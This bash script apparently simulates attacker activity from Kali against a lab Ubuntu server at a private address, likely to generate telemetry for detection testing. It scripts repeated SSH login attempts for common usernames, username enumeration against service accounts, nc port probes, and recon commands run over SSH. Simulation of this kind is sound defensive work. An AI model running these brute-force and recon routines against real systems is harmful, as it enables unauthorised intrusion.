#!/bin/bash
# Ubuntu Offense Simulation Pack (run from Kali)
# Target: Ubuntu Server 192.168.101.139

TARGET="192.168.101.139"

run_ssh_bruteforce() {
  USERS=("ubuntu" "admin" "testuser" "root" "backup" "oracle")
  for user in "${USERS[@]}"; do
    for i in {1..3}; do
      ssh -o PreferredAuthentications=password           -o PubkeyAuthentication=no           -o StrictHostKeyChecking=no           -o ConnectTimeout=3           ${user}@${TARGET} "exit" < /dev/null
      sleep 1
    done
  done
}

run_user_enumeration() {
  USERS=("svc_backup" "administrator" "devops" "dbadmin" "splunksvc" "helpdesk")
  for user in "${USERS[@]}"; do
    ssh -o PreferredAuthentications=password         -o PubkeyAuthentication=no         -o StrictHostKeyChecking=no         -o ConnectTimeout=3         ${user}@${TARGET} "exit" < /dev/null
    sleep 1
  done
}

run_ssh_probe() {
  for i in {1..10}; do
    nc -zv $TARGET 22
    sleep 1
  done
}

run_recon_attempts() {
  CMDS=("whoami" "id" "uname -a" "hostname" "ip a" "ps aux" "last")
  for cmd in "${CMDS[@]}"; do
    ssh ubuntu@$TARGET "$cmd" < /dev/null
    sleep 1
  done
}

run_all() {
  run_ssh_bruteforce
  run_user_enumeration
  run_ssh_probe
  run_recon_attempts
}

case "$1" in
  ssh_bruteforce) run_ssh_bruteforce ;;
  user_enum) run_user_enumeration ;;
  ssh_probe) run_ssh_probe ;;
  recon) run_recon_attempts ;;
  all) run_all ;;
  *) echo "Usage: $0 {ssh_bruteforce|user_enum|ssh_probe|recon|all}" ; exit 1 ;;
esac
